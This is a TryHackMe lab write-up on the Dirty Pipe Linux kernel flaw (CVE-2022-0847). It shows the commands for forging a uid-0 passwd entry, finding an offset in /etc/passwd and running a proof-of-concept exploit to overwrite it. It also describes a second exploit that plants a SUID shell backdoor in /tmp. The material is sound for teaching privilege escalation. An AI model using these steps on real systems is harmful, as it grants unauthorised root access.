---
description: https://tryhackme.com/room/dirtypipe
---

# Dirty Pipe: CVE-2022-0847

![](<../../../.gitbook/assets/image (12) (1) (1).png>)

## Background

In March 2022, a researcher named Max Kellerman publicly disclosed a Linux Kernel vulnerability (nicknamed "Dirty Pipe" for its similarities to the notorious "[Dirty Cow](https://dirtycow.ninja/)" exploit affecting older versions of the kernel) that allowed attackers to arbitrarily overwrite files on the operating system. The vulnerability was responsibly disclosed in early 2022 and was [publicly released in a blog post](https://dirtypipe.cm4all.com/) written by Max Kellerman soon after patches were made available.

Arbitrary file overwrites at the kernel level can be very easily leveraged to escalate privileges on the machine (i.e. to obtain administrator, or "root" privileges). This is a devastating vulnerability, made more so by its reach: any devices running a vulnerable version of the Linux kernel (including Android phones) are affected!

## Overview

Due to their low-level nature, any in-depth discussion of kernel vulnerabilities quickly becomes rather complicated. As such we will keep the information in this task relatively light, in the interests of keeping the information easy to digest. If you would like to read an in-depth explanation of the vulnerability (including a full code analysis), you are highly encouraged to check out Max Kellerman's [original blog post](https://dirtypipe.cm4all.com/).

## A Weaponized PoC

### Generating a SHA512Crypt Hash

The first thing we want to do is create a hash so that we can add a user to the /etc/passwd file

```bash
openssl passwd -6 --salt THM "PASSWORD"
$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.
```

We now want to make a template for what we want to add to /etc/passwd

```
'tyler:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash'
```

### Finding an Offset

We have our _file_ (`/etc/passwd`) and our _content_ (the passwd entry) — all we need now is the _offset_. The offset is where in the file the exploit should begin writing at — in other words, which part of the file gets overwritten.

The vulnerability won't allow us to append to the file, so we are going to have to pick an account and overwrite it. Realistically speaking, given the length of our passwd entry (hash inclusive), this will probably actually overwrite _several_ accounts. Looking through the passwd file, the `games` account stands out as being a good candidate for a little-used account which we can afford to nuke for a few minutes. We can use `grep` with the `-b` switch to find the offset of `games` from the start of the file:

```bash
tryhackme@dirty-pipe:~/Exploit/PoC$ grep -b "games" /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

### Compile the Exploit

![Compile the Exploit](<../../../.gitbook/assets/image (24) (1) (1) (1).png>)

### Run the Exploit

Then the command should look like this:

```bash
tryhackme@dirty-pipe:~/Exploit/PoC$ ./exploit /etc/passwd 189 'tyler:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
'
```

{% hint style="warning" %}
Note: It is important to have that ' on the next line
{% endhint %}

![It Worked!](<../../../.gitbook/assets/image (21) (1) (1).png>)

{% hint style="warning" %}
Note: This flag is partially hidden
{% endhint %}

<details>

<summary>flag.txt</summary>

THM{MmU4Zjg0NDdjNjFi\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}

</details>

## A Second Exploit

### Overview

In the previous task, we exploited the Dirty Pipe vulnerability using Max Kellerman's original proof of concept exploit code; however, other exploits have since been released. The original PoC allowed us to overwrite any file with arbitrary data at an offset of our choosing; however, other implementations have abused the arbitrary file write vulnerability in a variety of different ways.

To demonstrate this concept, a second exploit script has been added to the lab machine — this can be found on the target at `/home/tryhackme/Exploit/Bl4sty/dirtypipez.c`. As the directory structure suggests, this implementation was coded by [@bl4sty](https://twitter.com/bl4sty/), a security researcher who you may remember if you have already completed the "[SudoVulns: Baron Samedit](https://tryhackme.com/room/sudovulnssamedit)" room. The original exploit code can be downloaded from bl4sty's website [here](https://haxx.in/files/dirtypipez.c); however, as mentioned previously, a copy has already been added to the lab machine.

This exploit takes the arbitrary file write one stage further by abusing a rather special quality of the vulnerability. SUID Programs usually lose their [SUID bit](https://muirlandoracle.co.uk/2020/03/05/unix-file-permissions/#SUID) when you attempt to write to them; however, this does not happen with Dirty Pipe — in other words, we can write to any program that has permission to execute with higher privileges, without inadvertently destroying that extra permission (as would usually happen).

Bl4sty's exploit capitalises on this. Instead of overwriting a file like `/etc/passwd`, it overwrites a user-specified SUID binary (such as `/bin/su`), injecting shellcode into it which then gets executed with the permissions of the privileged user (i.e. `root`). Specifically, the exploit hijacks the chosen SUID binary and forces it to create a backdoor binary in  `/tmp` which has the SUID bit and calls `/bin/sh`. It then restores the targeted SUID binary to full working order by re-adding the overwritten section, and uses the newly created backdoor to grant the attacker a shell as the privileged user.

### Exploitation

#### Compile the Exploit

```bash
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ gcc dirtypipez.c -o exploit
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ ls
dirtypipez.c  exploit
```

#### Run the Exploit

![We got Root!](<../../../.gitbook/assets/image (9) (1) (1).png>)

## Lessons Learned

* When looking for a Linux privilege escalation keep an eye out for the kernel version because if it is 5.8, this could be an easy attack vector
* Even if the linux operating system is read-only (like [bottlerocket](https://github.com/bottlerocket-os/bottlerocket)) the kernel could still be vulnerable to this attack
